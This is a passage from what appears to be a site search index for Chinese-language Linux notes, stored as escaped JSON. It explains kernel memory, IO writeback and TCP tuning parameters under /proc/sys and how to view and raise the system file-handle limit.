0\u5141\u8bb8\u5229\u7528\u7b97\u6cd5\u5408\u7406\u7684\u8fc7\u5ea6\u5206\u914d\uff0c1\u503c\u5141\u8bb8\u8fc7\u5ea6\u5206\u914d\uff0c2\u7981\u6b62\u8fc7\u5ea6\u5206\u914d /proc/sys/vm/overcommit_ratio \u8fc7\u5ea6\u5206\u914d\u7684\u6bd4\u4f8b","title":"\u5185\u5b58\u76f8\u5173\uff1a"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#io","text":"/proc/sys/vm/dirty_background_ratio \u8be5\u6587\u4ef6\u8868\u793a\u810f\u6570\u636e\u5230\u8fbe\u7cfb\u7edf\u6574\u4f53\u5185\u5b58\u7684\u767e\u5206\u6bd4\uff0c\u6b64\u65f6\u89e6\u53d1pdflush\u8fdb\u7a0b\u628a\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a10 \u5f53\u7528\u6237\u8c03\u7528write\u65f6\uff0c\u5982\u679c\u53d1\u73b0\u7cfb\u7edf\u4e2d\u7684\u810f\u6570\u636e\u5927\u4e8e\u8fd9\u9608\u503c\uff08\u6216dirty_background_bytes \uff09\uff0c\u4f1a\u89e6\u53d1pdflush\u8fdb\u7a0b\u53bb\u5199\u810f\u6570\u636e\uff0c\u4f46\u662f\u7528\u6237\u7684write\u8c03\u7528\u4f1a\u7acb\u5373\u8fd4\u56de\uff0c\u65e0\u9700\u7b49\u5f85\u3002pdflush\u5237\u810f\u9875\u7684\u6807\u51c6\u662f\u8ba9\u810f\u9875\u964d\u4f4e\u5230\u8be5\u9608\u503c\u4ee5\u4e0b\u3002\u5373\u4f7fcgroup\u9650\u5236\u4e86\u7528\u6237\u8fdb\u7a0b\u7684IOPS\uff0c\u4e5f\u65e0\u6240\u8c13\u3002 /proc/sys/vm/dirty_background_bytes \u63a7\u5236\u810f\u9875\u5185\u5b58\u6570\u91cf\uff0c\u8d85\u8fc7dirty_background_bytes\u65f6\uff0c\u5185\u6838\u7684flush\u7ebf\u7a0b\u5f00\u59cb\u56de\u5199\u810f\u9875 \u9ed8\u8ba4\u4e3a0 /proc/sys/vm/dirty_expire_centisecs \u8be5\u6587\u4ef6\u8868\u793a\u5982\u679c\u810f\u6570\u636e\u5728\u5185\u5b58\u4e2d\u9a7b\u7559\u65f6\u95f4\u8d85\u8fc7\u8be5\u503c\uff0cpdflush\u8fdb\u7a0b\u5728\u4e0b\u4e00\u6b21\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a3000\uff081/100\u79d2\uff09 /proc/sys/vm/dirty_writeback_centisecs \u8be5\u6587\u4ef6\u8868\u793apdflush\u8fdb\u7a0b\u7684\u5524\u9192\u95f4\u9694\uff0c\u5468\u671f\u6027\u628a\u8d85\u8fc7dirty_expire_centisecs\u65f6\u95f4\u7684\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002 \u7f3a\u7701\u8bbe\u7f6e\uff1a500\uff081/100\u79d2\uff09 /proc/sys/vm/dirty_ratio \u8be5\u6587\u4ef6\u8868\u793a\u5982\u679c\u8fdb\u7a0b\u4ea7\u751f\u7684\u810f\u6570\u636e\u5230\u8fbe\u7cfb\u7edf\u6574\u4f53\u5185\u5b58\u7684\u767e\u5206\u6bd4\uff0c\u6b64\u65f6\u7528\u6237\u8fdb\u7a0b\u81ea\u884c\u628a\u810f\u6570\u636e\u5199\u56de\u78c1\u76d8\u3002\u7f3a\u7701\u8bbe\u7f6e\uff1a40\u3002\u5f53\u7528\u6237\u8c03\u7528write\u65f6\uff0c\u5982\u679c\u53d1\u73b0\u7cfb\u7edf\u4e2d\u7684\u810f\u6570\u636e\u5927\u4e8e\u8fd9\u9608\u503c\uff08\u6216dirty_bytes \uff09\uff0c\u9700\u8981\u81ea\u5df1\u628a\u810f\u6570\u636e\u5237\u56de\u78c1\u76d8\uff0c\u964d\u4f4e\u5230\u8fd9\u4e2a\u9608\u503c\u4ee5\u4e0b\u624d\u8fd4\u56de\u3002\u6ce8\u610f\uff0c\u6b64\u65f6\u5982\u679ccgroup\u9650\u5236\u4e86\u7528\u6237\u8fdb\u7a0b\u7684IOPS\uff0c\u90a3\u5c31\u60b2\u5267\u4e86\u3002 /proc/sys/vm/dirty_bytes \u63a7\u5236\u810f\u9875\u5185\u5b58\u6570\u91cf\uff0c\u8fbe\u5230dirty_bytes\u65f6\uff0c\u6267\u884c\u78c1\u76d8\u5199\u64cd\u4f5c\u7684\u8fdb\u7a0b\u5f00\u59cb\u56de\u5199\u810f\u9875 /proc/sys/vm/nr_pdflush_threads \u7cfb\u7edf\u91cc\u901a\u5e38\u53ea\u80fd\u67092\uff5e8\u4e2apdflush\u8fdb\u7a0b\uff0c\u5f53\u524dpdflush\u8fdb\u7a0b\u4e2a\u6570\u53ef\u4ee5\u901a\u8fc7/proc/sys/vm/nr_pdflush_threads \u67e5\u770b\u3002\u5f53\u7cfb\u7edf\u5185\u5168\u90e8pdflush\u8fdb\u7a0b\u7e41\u5fd9\u8d85\u8fc71\u79d2\u540e\uff0c\u7cfb\u7edf\u4f1a\u542f\u52a8\u4e00\u65b0pdflush\u8fdb\u7a0b\u3002\u5f53\u8d85\u8fc7\u4e00\u79d2\u540e\uff0c\u7cfb\u7edf\u5f53\u524d\u5168\u90e8pdflush\u8fdb\u7a0b\u7a7a\u95f2\u65f6\uff0c\u7cfb\u7edf\u4f1a\u6740\u6b7b\u4e00\u4e2apdflush\u8fdb\u7a0b\u3002","title":"IO\u76f8\u5173\uff1a"},{"location":"system/linux/IO/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0/#_4","text":"/proc/sys/net/core/rmem_default \u9ed8\u8ba4\u7684TCP\u6570\u636e\u63a5\u6536\u7a97\u53e3\u5927\u5c0f\uff08\u5b57\u8282\uff09\u3002229376 /proc/sys/net/core/rmem_max \u6700\u5927\u7684TCP\u6570\u636e\u63a5\u6536\u7a97\u53e3\uff08\u5b57\u8282\uff09\u3002131071 /proc/sys/net/core/wmem_default \u9ed8\u8ba4\u7684TCP\u6570\u636e\u53d1\u9001\u7a97\u53e3\u5927\u5c0f\uff08\u5b57\u8282\uff09\u3002229376 /proc/sys/net/core/wmem_max \u6700\u5927\u7684TCP\u6570\u636e\u53d1\u9001\u7a97\u53e3\uff08\u5b57\u8282\uff09\u3002131071 /proc/sys/net/core/netdev_max_backlog \u5728\u6bcf\u4e2a\u7f51\u7edc\u63a5\u53e3\u63a5\u6536\u6570\u636e\u5305\u7684\u901f\u7387\u6bd4\u5185\u6838\u5904\u7406\u8fd9\u4e9b\u5305\u7684\u901f\u7387\u5feb\u65f6\uff0c\u5141\u8bb8\u9001\u5230\u961f\u5217\u7684\u6570\u636e\u5305\u7684\u6700\u5927\u6570\u76ee\u30021000 /proc/sys/net/core/somaxconn \u5b9a\u4e49\u4e86\u7cfb\u7edf\u4e2d\u6bcf\u4e00\u4e2a\u7aef\u53e3\u6700\u5927\u7684\u76d1\u542c\u961f\u5217\u7684\u957f\u5ea6\uff0c\u8fd9\u662f\u4e2a\u5168\u5c40\u7684\u53c2\u6570\u3002128 /proc/sys/net/core/optmem_max \u8868\u793a\u6bcf\u4e2a\u5957\u63a5\u5b57\u6240\u5141\u8bb8\u7684\u6700\u5927\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u300220480 /proc/sys/net/ipv4/tcp_mem \u786e\u5b9aTCP\u6808\u5e94\u8be5\u5982\u4f55\u53cd\u6620\u5185\u5b58\u4f7f\u7528\uff0c\u6bcf\u4e2a\u503c\u7684\u5355\u4f4d\u90fd\u662f\u5185\u5b58\u9875\uff08\u901a\u5e38\u662f4KB\uff09\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u5185\u5b58\u4f7f\u7528\u7684\u4e0b\u9650\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u5185\u5b58\u538b\u529b\u6a21\u5f0f\u5f00\u59cb\u5bf9\u7f13\u51b2\u533a\u4f7f\u7528\u5e94\u7528\u538b\u529b \u7684\u4e0a\u9650\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u5185\u5b58\u4f7f\u7528\u7684\u4e0a\u9650\u3002\u5728\u8fd9\u4e2a\u5c42\u6b21\u4e0a\u53ef\u4ee5\u5c06\u62a5\u6587\u4e22\u5f03\uff0c\u4ece\u800c\u51cf\u5c11\u5bf9\u5185\u5b58\u7684\u4f7f\u7528\u3002\u5bf9\u4e8e\u8f83\u5927\u7684BDP\u53ef\u4ee5\u589e\u5927\u8fd9\u4e9b\u503c\uff08\u6ce8\u610f\uff0c\u5176\u5355\u4f4d\u662f\u5185\u5b58\u9875\u800c\u4e0d\u662f\u5b57 \u8282\uff09\u300294011 125351 188022 /proc/sys/net/ipv4/tcp_rmem \u4e3a \u81ea\u52a8\u8c03\u4f18\u5b9a\u4e49socket\u4f7f\u7528\u7684\u5185\u5b58\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u4e3asocket\u63a5\u6536\u7f13\u51b2\u533a\u5206\u914d\u7684\u6700\u5c11\u5b57\u8282\u6570\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u9ed8\u8ba4\u503c\uff08\u8be5\u503c\u4f1a\u88abrmem_default\u8986 \u76d6\uff09\uff0c\u7f13\u51b2\u533a\u5728\u7cfb\u7edf\u8d1f\u8f7d\u4e0d\u91cd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u589e\u957f\u5230\u8fd9\u4e2a\u503c\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u63a5\u6536\u7f13\u51b2\u533a\u7a7a\u95f4\u7684\u6700\u5927\u5b57\u8282\u6570\uff08\u8be5\u503c\u4f1a\u88abrmem_max\u8986\u76d6\uff09\u30024096 87380 4011232 /proc/sys/net/ipv4/tcp_wmem \u4e3a\u81ea\u52a8\u8c03\u4f18\u5b9a\u4e49socket\u4f7f\u7528\u7684\u5185\u5b58\u3002\u7b2c\u4e00\u4e2a\u503c\u662f\u4e3asocket\u53d1\u9001\u7f13\u51b2\u533a\u5206\u914d\u7684\u6700\u5c11\u5b57\u8282\u6570\uff1b\u7b2c\u4e8c\u4e2a\u503c\u662f\u9ed8\u8ba4\u503c\uff08\u8be5\u503c\u4f1a\u88abwmem_default\u8986 \u76d6\uff09\uff0c\u7f13\u51b2\u533a\u5728\u7cfb\u7edf\u8d1f\u8f7d\u4e0d\u91cd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u589e\u957f\u5230\u8fd9\u4e2a\u503c\uff1b\u7b2c\u4e09\u4e2a\u503c\u662f\u53d1\u9001\u7f13\u51b2\u533a\u7a7a\u95f4\u7684\u6700\u5927\u5b57\u8282\u6570\uff08\u8be5\u503c\u4f1a\u88abwmem_max\u8986\u76d6\uff09\u30024096 16384 4011232 /proc/sys/net/ipv4/tcp_keepalive_time TCP\u53d1\u9001keepalive\u63a2\u6d4b\u6d88\u606f\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\uff0c\u7528\u4e8e\u786e\u8ba4TCP\u8fde\u63a5\u662f\u5426\u6709\u6548\u3002 7200 \u9ed8\u8ba4\u4e3a2\u5c0f\u65f6\uff0c\u53ef\u4ee5\u6539\u621020\u5206\u949f /proc/sys/net/ipv4/tcp_keepalive_intvl \u63a2\u6d4b\u6d88\u606f\u672a\u83b7\u5f97\u54cd\u5e94\u65f6\uff0c\u91cd\u53d1\u8be5\u6d88\u606f\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\u300275 /proc/sys/net/ipv4/tcp_keepalive_probes \u5728\u8ba4\u5b9aTCP\u8fde\u63a5\u5931\u6548\u4e4b\u524d\uff0c\u6700\u591a\u53d1\u9001\u591a\u5c11\u4e2akeepalive\u63a2\u6d4b\u6d88\u606f\u30029 /proc/sys/net/ipv4/tcp_sack \u542f\u7528\u6709\u9009\u62e9\u7684\u5e94\u7b54\uff081\u8868\u793a\u542f\u7528\uff09\uff0c\u901a\u8fc7\u6709\u9009\u62e9\u5730\u5e94\u7b54\u4e71\u5e8f\u63a5\u6536\u5230\u7684\u62a5\u6587\u6765\u63d0\u9ad8\u6027\u80fd\uff0c\u8ba9\u53d1\u9001\u8005\u53ea\u53d1\u9001\u4e22\u5931\u7684\u62a5\u6587\u6bb5\uff0c\uff08\u5bf9\u4e8e\u5e7f\u57df\u7f51\u901a\u4fe1\u6765\u8bf4\uff09\u8fd9\u4e2a\u9009\u9879\u5e94\u8be5\u542f\u7528\uff0c\u4f46\u662f\u4f1a\u589e\u52a0\u5bf9CPU\u7684\u5360\u7528\u30021 /proc/sys/net/ipv4/tcp_fack \u542f\u7528\u8f6c\u53d1\u5e94\u7b54\uff0c\u53ef\u4ee5\u8fdb\u884c\u6709\u9009\u62e9\u5e94\u7b54\uff08SACK\uff09\u4ece\u800c\u51cf\u5c11\u62e5\u585e\u60c5\u51b5\u7684\u53d1\u751f\uff0c\u8fd9\u4e2a\u9009\u9879\u4e5f\u5e94\u8be5\u542f\u7528\u30021 /proc/sys/net/ipv4/tcp_timestamps TCP\u65f6\u95f4\u6233\uff08\u4f1a\u5728TCP\u5305\u5934\u589e\u52a012\u4e2a\u5b57\u8282\uff09\uff0c\u4ee5\u4e00\u79cd\u6bd4\u91cd\u53d1\u8d85\u65f6\u66f4\u7cbe\u786e\u7684\u65b9\u6cd5\uff08\u53c2\u8003RFC 1323\uff09\u6765\u542f\u7528\u5bf9RTT \u7684\u8ba1\u7b97\uff0c\u4e3a\u5b9e\u73b0\u66f4\u597d\u7684\u6027\u80fd\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30021 /proc/sys/net/ipv4/tcp_window_scaling \u542f\u7528RFC 1323\u5b9a\u4e49\u7684window scaling\uff0c\u8981\u652f\u6301\u8d85\u8fc764KB\u7684TCP\u7a97\u53e3\uff0c\u5fc5\u987b\u542f\u7528\u8be5\u503c\uff081\u8868\u793a\u542f\u7528\uff09\uff0cTCP\u7a97\u53e3\u6700\u5927\u81f31GB\uff0cTCP\u8fde\u63a5\u53cc\u65b9\u90fd\u542f\u7528\u65f6\u624d\u751f\u6548\u30021 /proc/sys/net/ipv4/tcp_syncookies \u8868\u793a\u662f\u5426\u6253\u5f00TCP\u540c\u6b65\u6807\u7b7e\uff08syncookie\uff09\uff0c\u5185\u6838\u5fc5\u987b\u6253\u5f00\u4e86CONFIG_SYN_COOKIES\u9879\u8fdb\u884c\u7f16\u8bd1\uff0c\u540c\u6b65\u6807\u7b7e\u53ef\u4ee5\u9632\u6b62\u4e00\u4e2a\u5957\u63a5\u5b57\u5728\u6709\u8fc7\u591a\u8bd5\u56fe\u8fde\u63a5\u5230\u8fbe\u65f6\u5f15\u8d77\u8fc7\u8f7d\u30021 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed /proc/sys/net/ipv4/tcp_tw_reuse \u8868\u793a\u662f\u5426\u5141\u8bb8\u5c06\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684socket\uff08TIME-WAIT\u7684\u7aef\u53e3\uff09\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5 \u3002\u9ed8\u8ba4\u4e3a0\uff0c\u5efa\u8bae\u6253\u5f00\uff0c\u8bbe\u7f6e\u4e3a1 /proc/sys/net/ipv4/tcp_tw_recycle \u80fd\u591f\u66f4\u5feb\u5730\u56de\u6536TIME-WAIT\u5957\u63a5\u5b57\u3002\u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 /proc/sys/net/ipv4/tcp_fin_timeout \u5bf9\u4e8e\u672c\u7aef\u65ad\u5f00\u7684socket\u8fde\u63a5\uff0cTCP\u4fdd\u6301\u5728FIN-WAIT-2\u72b6\u6001\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002\u5bf9\u65b9\u53ef\u80fd\u4f1a\u65ad\u5f00\u8fde\u63a5\u6216\u4e00\u76f4\u4e0d\u7ed3\u675f\u8fde\u63a5\u6216\u4e0d\u53ef\u9884\u6599\u7684\u8fdb\u7a0b\u6b7b\u4ea1\u3002\u9ed8\u8ba4\u503c\u4e3a60\uff0c\u5efa\u8bae\u4e3a30 /proc/sys/net/ipv4/ip_local_port_range \u8868\u793aTCP/UDP\u534f\u8bae\u5141\u8bb8\u4f7f\u7528\u7684\u672c\u5730\u7aef\u53e3\u53f7 \u9ed8\u8ba4\u4e3a 32768 61000 \u5efa\u8bae\u4fee\u6539\u4e3a 1024 65000 | /proc/sys/net/ipv4/tcp_max_syn_backlog \u5bf9\u4e8e\u8fd8\u672a\u83b7\u5f97\u5bf9\u65b9\u786e\u8ba4\u7684\u8fde\u63a5\u8bf7\u6c42\uff0c\u53ef\u4fdd\u5b58\u5728\u961f\u5217\u4e2d\u7684\u6700\u5927\u6570\u76ee\u3002\u5982\u679c\u670d\u52a1\u5668\u7ecf\u5e38\u51fa\u73b0\u8fc7\u8f7d\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u589e\u52a0\u8fd9\u4e2a\u6570\u5b57\u3002 \u8868\u793aSYN\u961f\u5217\u7684\u957f\u5ea6\uff0c\u9ed8\u8ba4\u4e3a1024\uff0c\u52a0\u5927\u961f\u5217\u957f\u5ea6\u4e3a8192\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u66f4\u591a\u7b49\u5f85\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u63a5\u6570\u3002 /proc/sys/net/ipv4/tcp_low_latency \u5141\u8bb8TCP/IP\u6808\u9002\u5e94\u5728\u9ad8\u541e\u5410\u91cf\u60c5\u51b5\u4e0b\u4f4e\u5ef6\u65f6\u7684\u60c5\u51b5\uff0c\u8fd9\u4e2a\u9009\u9879\u5e94\u8be5\u7981\u7528\u30020 /proc/sys/net/ipv4/tcp_westwood \u542f\u7528\u53d1\u9001\u8005\u7aef\u7684\u62e5\u585e\u63a7\u5236\u7b97\u6cd5\uff0c\u5b83\u53ef\u4ee5\u7ef4\u62a4\u5bf9\u541e\u5410\u91cf\u7684\u8bc4\u4f30\uff0c\u5e76\u8bd5\u56fe\u5bf9\u5e26\u5bbd\u7684\u6574\u4f53\u5229\u7528\u60c5\u51b5\u8fdb\u884c\u4f18\u5316\uff0c\u5bf9\u4e8eWAN \u901a\u4fe1\u6765\u8bf4\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30020 /proc/sys/net/ipv4/tcp_bic \u4e3a\u5feb\u901f\u957f\u8ddd\u79bb\u7f51\u7edc\u542f\u7528Binary Increase Congestion\uff0c\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u5730\u5229\u7528\u4ee5GB\u901f\u5ea6\u8fdb\u884c\u64cd\u4f5c\u7684\u94fe\u63a5\uff0c\u5bf9\u4e8eWAN\u901a\u4fe1\u5e94\u8be5\u542f\u7528\u8fd9\u4e2a\u9009\u9879\u30021 /proc/sys/net/ipv4/tcp_max_tw_buckets \u8868\u793a\u7cfb\u7edf\u540c\u65f6\u4fdd\u6301TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u5b57\uff0cTIME_WAIT\u5957\u63a5\u5b57\u5c06\u7acb\u523b\u88ab\u6e05\u9664\u5e76\u6253\u5370\u8b66\u544a\u4fe1\u606f\u3002\u9ed8\u8ba4\u4e3a180000\uff0c\u6539\u4e3a5000\u3002\u5bf9\u4e8eApache\u3001Nginx\u7b49\u670d\u52a1\u5668\uff0c\u4e0a\u51e0\u884c\u7684\u53c2\u6570\u53ef\u4ee5\u5f88\u597d\u5730\u51cf\u5c11TIME_WAIT\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u4f46\u662f\u5bf9\u4e8e Squid\uff0c\u6548\u679c\u5374\u4e0d\u5927\u3002\u6b64\u9879\u53c2\u6570\u53ef\u4ee5\u63a7\u5236TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u907f\u514dSquid\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684TIME_WAIT\u5957\u63a5\u5b57\u62d6\u6b7b\u3002","title":"\u7f51\u7edc\u76f8\u5173\uff1a"},{"location":"system/linux/IO/%E5%8F%A5%E6%9F%84/","text":"\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u4e2d\u53e5\u67c4\u6570\u91cf /proc/sys/fs/file-nr \u6587\u4ef6\u8fd4\u56de\u7684\u4e09\u4e2a\u6570\u5b57\u5206\u522b\u4ee3\u8868\u4ee5\u4e0b\u542b\u4e49\uff1a \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u8868\u793a\u5f53\u524d\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u6570\u91cf\u3002\u6587\u4ef6\u53e5\u67c4\u662f\u7cfb\u7edf\u7528\u4e8e\u6807\u8bc6\u6253\u5f00\u6587\u4ef6\u7684\u4e00\u4e2a\u5f15\u7528\u3002 \u5206\u914d\u7684\u6587\u4ef6\u53e5\u67c4\u603b\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u8868\u793a\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u603b\u6570\u3002\u4e0d\u662f\u6240\u6709\u7684\u5206\u914d\u90fd\u4f1a\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u9ad8\u4e8e\u7b2c\u4e00\u4e2a\u6570\u5b57\u3002 \u7cfb\u7edf\u5141\u8bb8\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u662f\u7cfb\u7edf\u914d\u7f6e\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u3002\u8fd9\u662f\u7cfb\u7edf\u7ea7\u522b\u7684\u9650\u5236\uff0c\u610f\u5473\u7740\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u8fdb\u7a0b\u5171\u4eab\u8fd9\u4e2a\u9650\u5236\u3002\u5f53\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u53e5\u67c4\u6570\u91cf\u8fbe\u5230\u8fd9\u4e2a\u6570\u65f6\uff0c\u5c06\u65e0\u6cd5\u6253\u5f00\u66f4\u591a\u7684\u6587\u4ef6\u3002 \u4f8b\u5982\uff0c\u5982\u679c /proc/sys/fs/file-nr \u6587\u4ef6\u663e\u793a 1024 4096 32768 \uff0c\u8fd9\u610f\u5473\u7740\u5f53\u524d\u67091024\u4e2a\u6587\u4ef6\u53e5\u67c4\u6b63\u5728\u4f7f\u7528\u4e2d\uff0c\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u4e864096\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u800c\u7cfb\u7edf\u914d\u7f6e\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u4e3a32768\u3002 \u8fd9\u4e9b\u6570\u5b57\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u8bf4\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u7cfb\u7edf\u8fbe\u5230\u6587\u4ef6\u53e5\u67c4\u7684\u9650\u5236\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6587\u4ef6\u6253\u5f00\u5931\u8d25\uff0c\u5f71\u54cd\u7cfb\u7edf\u7a33\u5b9a\u6027\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\u3002\u5982\u679c\u53d1\u73b0\u6b63\u5728\u4f7f\u7528\u7684\u6587\u4ef6\u53e5\u67c4\u6570\u91cf\u63a5\u8fd1\u6700\u5927\u9650\u5236\uff0c\u7ba1\u7406\u5458\u53ef\u80fd\u9700\u8981\u589e\u52a0\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u6216\u4f18\u5316\u5e94\u7528\u7a0b\u5e8f\u4ee5\u51cf\u5c11\u6587\u4ef6\u53e5\u67c4\u7684\u4f7f\u7528\u3002 \u8bbe\u7f6e\u7cfb\u7edf\u6700\u5927\u53e5\u67c4\u6570\u91cf \u901a\u8fc7 /proc/sys/fs/file-max \u6587\u4ef6\u8bbe\u7f6e\uff0c \u8fd9\u4e2a\u6587\u4ef6\u63a7\u5236\u7740\u7cfb\u7edf\u7ea7\u522b\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u3002\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684\u9650\u5236\u5e76\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u65b0\u503c\u3002 \u67e5\u770b\u5f53\u524d\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff1a bashCopy code cat /proc/sys/fs/file-max \u4e34\u65f6\u8bbe\u7f6e\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff08\u5728\u4e0b\u6b21\u91cd\u542f\u540e\u5931\u6548\uff09\uff1a bashCopy code echo [number] > /proc/sys/fs/file-max \u6c38\u4e45\u8bbe\u7f6e\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff0c\u9700\u8981\u7f16\u8f91 /etc/sysctl.conf \u6587\u4ef6\uff0c\u6dfb\u52a0\u6216\u4fee\u6539\u4ee5\u4e0b\u884c\uff1a bashCopy code fs.file-max = [number] \u7136\u540e\u8fd0\u884c sysctl -p \u6765\u4f7f\u6539\u52a8\u751f\u6548\u3002 \u53e5\u67c4\u7684\u610f\u4e49 \u5728CentOS\u8fd9\u6837\u7684Linux\u7cfb\u7edf\u4e2d\uff0c\u53e5\u67c4\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6982\u5ff5\u3002\u53e5\u67c4\uff08Handle\uff09\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u7528\u4e8e\u5728\u8f6f\u4ef6\u4e2d\u4ee3\u8868\u548c\u7ba1\u7406\u5bf9\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u3002\u8fd9\u4e9b\u8d44\u6e90\u53ef\u4ee5\u5305\u62ec\u6587\u4ef6\u3001\u7f51\u7edc\u8fde\u63a5\u3001\u8fdb\u7a0b\u3001\u7ebf\u7a0b\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002\u53e5\u67c4\u7684\u4e3b\u8981\u7528\u9014\u548c\u610f\u4e49\u5305\u62ec\uff1a 1.\u8d44\u6e90\u5f15\u7528 \uff1a\u53e5\u67c4\u5145\u5f53\u8d44\u6e90\u7684\u5f15\u7528\u6216\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u7a0b\u5e8f\u901a\u8fc7\u8fd9\u4e2a\u53e5\u67c4\u6765\u8fdb\u884c\u540e\u7eed\u7684\u8bfb\u5199\u64cd\u4f5c\u3002 2.\u62bd\u8c61\u5316\u8d44\u6e90\u64cd\u4f5c \uff1a\u53e5\u67c4\u63d0\u4f9b\u4e86\u4e00\u79cd\u62bd\u8c61\u7684\u65b9\u5f0f\u6765\u64cd\u4f5c\u8d44\u6e90\u3002\u7a0b\u5e8f\u5458\u4e0d\u9700\u8981\u77e5\u9053\u8d44\u6e90\u7684\u5177\u4f53\u7269\u7406\u7ec6\u8282\uff08\u5982\u5185\u5b58\u5730\u5740\uff09\uff0c\u800c\u662f\u901a\u8fc7\u53e5\u67c4\u6765\u64cd\u4f5c\u3002 3.\u5b89\u5168\u6027\u548c\u7a33\u5b9a\u6027 \uff1a\u901a\u8fc7\u53e5\u67c4\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u63a7\u5236\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u9632\u6b62\u672a\u6388\u6743\u7684\u8bbf\u95ee\u548c\u6f5c\u5728\u7684\u51b2\u7a81\uff0c\u589e\u52a0\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u7a33\u5b9a\u6027\u3002 4.\u8d44\u6e90\u7ba1\u7406 \uff1a\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7\u53e5\u67c4\u6765\u8ddf\u8e2a\u8d44\u6e90\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u8fd9\u6709\u52a9\u4e8e\u8d44\u6e90\u7684\u5206\u914d\u548c\u56de\u6536\uff0c\u9632\u6b62\u8d44\u6e90\u6cc4\u9732\u3002 5.\u8de8\u8fdb\u7a0b\u901a\u4fe1 